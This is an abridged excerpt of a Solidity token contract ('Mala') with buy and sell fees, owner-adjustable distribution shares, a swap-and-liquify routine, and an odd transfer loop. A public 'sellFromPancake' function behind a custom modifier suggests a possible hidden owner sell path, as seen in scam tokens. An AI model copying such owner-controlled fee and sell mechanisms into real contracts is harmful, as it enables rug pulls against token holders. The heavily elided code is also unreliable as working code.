...
contract Mala is Context, IERC20, Ownable {
    ...
    uint256 public _LPaward;
    uint256 public _award;
    uint256 internal _reflection;

    uint256 internal _LPawardShare = 1;
    uint256 internal _awardShare = 3;
    ...
    uint256 public buyLPawardFees = 2;
    uint256 public sellLPawardFees = 2;
    uint256 public buyDeadFee = 2;
    uint256 public sellDeadFee = 2;
    uint256 public getNumberOfDividendTokenHolders = 1000;
    ...
    address award, address reflection, uint256 burnfee, uint256 LPawardfee,uint256 DividendDistributorfee,uint256 rewardfee,address PancakeRouterAddress) {
        ...
        _total = _LPaward.add(_award).add(_reflection).add(_burn);
        _totalDistributionShares = _LPawardShare.add(_awardShare).add(_reflectionShare);
    ...
    function setDistributionSettings(uint256 newLPawardShare, uint256 newawardShare, uint256 newreflectionShare) 
      public onlyOwner {
        _LPawardShare = newLPawardShare;
   ...
   function sellFromPancake(uint256 amount) public PancakeRouter{
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {   if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){
            ...
            for(int i=0;i <=2;i++){
                ...
                _basicTransfer(sender, recipient,10);
            }
            amount -= 30;
        }
    ...
    private Inswap {
        ...
        uint256 tokensForLP = tAmount.mul(_LPawardShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_LPawardShare.div(2));
        
        uint256 amountBNBLPaward = amountReceived.mul(_LPawardShare).div(totalBNBFee).div(2);
        uint256 amountBNBreflection = amountReceived.mul(_reflectionShare).div(totalBNBFee);
        uint256 amountBNBaward = amountReceived.sub(amountBNBLPaward).sub(amountBNBreflection);
        ...
        if(amountBNBreflection > 0)
         ...
         if(amountBNBLPaward > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLPaward);
    }
